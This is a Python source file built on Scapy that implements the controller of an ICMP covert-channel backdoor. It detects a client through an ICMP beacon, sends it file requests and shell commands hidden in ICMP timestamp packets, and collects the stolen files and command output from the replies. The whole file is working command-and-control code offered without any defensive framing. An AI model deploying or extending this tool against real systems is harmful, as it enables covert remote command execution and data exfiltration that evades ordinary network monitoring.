
from scapy.all import sniff, send, Raw
from scapy.layers.inet import IP, ICMP

FRAGMENT_SIZE = 1400

def detect_client():
    print("Awaiting a client beacon to detect IP.")
    pkt = sniff(filter="icmp", count=1, timeout=10)
    if pkt:
        p = pkt[0]
        if ICMP in p and p[ICMP].type == 14:
            return p[IP].src
    return None


def server():
    client_ip = None

    while True:
        if not client_ip:
            found_ip = detect_client()
            if found_ip:
                client_ip = found_ip
                print(f"Client IP detected: {client_ip}")
            else:
                print("No client beacon received. Try again or check the client.")
                continue

        user_input = input("\nEnter 1 for file and 2 for shell command, 'exit' to exit: ")

        match user_input:
            case 'exit':
                print("Server shutting down.")
                break

            case '1':
                file_name = input("Enter file name to search: ")
                if not file_name:
                    print("You didn't type a file name.")
                    continue

                print(f"Requesting file '{file_name}' from client.")
                send(IP(dst=client_ip) / ICMP(type=13) / f"{file_name}".encode())

                file_data = b''
                print(f"Waiting for data for '{file_name}'.")
                packets = sniff(filter=f"icmp and host {client_ip}",timeout=20)

                for pkt in packets:
                    if ICMP in pkt and Raw in pkt:
                        chunk = pkt[Raw].load
                        file_data += chunk

                if file_data:
                    with open(file_name, "wb") as f:
                        f.write(file_data)
                    print(f"Received and saved file: {file_name}")
                else:
                    print("No file data received.")

            case '2':
                command = input("Enter a command: ")
                print(f"Sending command '{command}' to client.")
                send(IP(dst=client_ip) / ICMP(type=13) / command.encode())

                print("Command sent")
                cmd_output_packets = sniff(filter=f"icmp and host {client_ip}",count=1,timeout=10)
                print(f"received cmd output{cmd_output_packets}")
                if cmd_output_packets:
                    pkt = cmd_output_packets[0]
                    if ICMP in pkt and  pkt[ICMP].type == 14 and Raw in pkt:
                        print("Client output:")
                        print(pkt[Raw].load.decode()) #errors='replace'
                else:
                    print("No packets from client.")
            case _:
                print("Wrong input")


if __name__ == "__main__":
    server()
